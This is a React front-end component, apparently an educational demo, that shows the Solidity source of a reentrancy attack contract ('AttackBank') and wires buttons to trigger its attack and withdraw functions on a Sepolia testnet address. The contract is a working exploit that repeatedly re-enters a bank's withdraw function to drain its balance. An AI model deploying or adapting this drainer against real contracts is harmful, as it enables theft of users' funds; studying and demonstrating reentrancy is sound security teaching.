import { useState } from "react";
import { useBalance, useContractRead, useContractWrite, usePrepareContractWrite, useSigner } from "wagmi";
import attackInterface from "../AttackBank.sol/AttackBank.json";
import { BigNumber, ethers } from "ethers";

const Attack = () => {
  const attackCode = `
import "./Bank.sol";

contract AttackBank {
  uint256 public MINIMUM_STEP = 1 * 10**16; // 0.01 ETH (adjust to needs)
  Bank public bank;

  constructor(address _bank) {
      bank = Bank(_bank);
  }

  function setNewBank(address _bank) public {
      bank = Bank(_bank);
  }

  function setMinimumStep(uint256 _newStep) public {
      MINIMUM_STEP = _newStep;
  }

  function attack() public payable {
      bank.deposit{value: msg.value}();
      bank.withdraw();
  }

  receive() external payable {
      if (bank.getCurrentBalance() >= MINIMUM_STEP) {
          bank.withdraw();
      }
  }

  function withdraw() public {
      payable(msg.sender).transfer(address(this).balance);
  }
}
// CONTRACT ADDRESS: 0x54e1dfb04bedb5060055B13b84deC4aC58080601
// sepolia.etherscan.io/address/0x54e1dfb04bedb5060055B13b84deC4aC58080601`;

  const { data: signer, isError, isLoading } = useSigner();
  const attackAddress = "0x54e1dfb04bedb5060055B13b84deC4aC58080601"

  const [displayedBalance, setDisplayedBalance] = useState("");
  const { data: balance, isLoading: isLoadingBalance } = useBalance({
    address: attackAddress,
    onSuccess(balance) {
      setDisplayedBalance(balance.formatted);
    },
    watch: true,
  });

  const {config: attackConfig} = usePrepareContractWrite({
    address: attackAddress,
    abi: attackInterface.abi,
    functionName: 'attack',
    overrides: {
      value: ethers.utils.parseEther('0.1'),
      gasLimit: BigNumber.from(3000000)
    }
  })
  const {data: attackTx, isLoading: isLoadingAttackTx, write: attack} = useContractWrite(attackConfig)

  const {config: withdrawConfig} = usePrepareContractWrite({
    address: attackAddress,
    abi: attackInterface.abi,
    functionName: 'withdraw',
  })
  const {data: withdrawTx, write: withdraw} = useContractWrite(withdrawConfig)

  return (
    <div className="contract attack">
      {!signer && <button disabled>Attack</button>}

      {signer && 
      <>
      <button disabled={!attack} onClick={()=>attack?.()}>Attack (0.1 ETH)</button>
      <button disabled={!withdraw} onClick={()=>withdraw?.()}>Withdraw</button>
      </>
      }
      <pre>
      {isLoadingBalance ? <span>...</span> : <span>Balance: {displayedBalance}</span>}
        <code>{attackCode}</code>
      </pre>
      <div className="contract_actions">
      </div>
    </div>
  );
};

export default Attack;
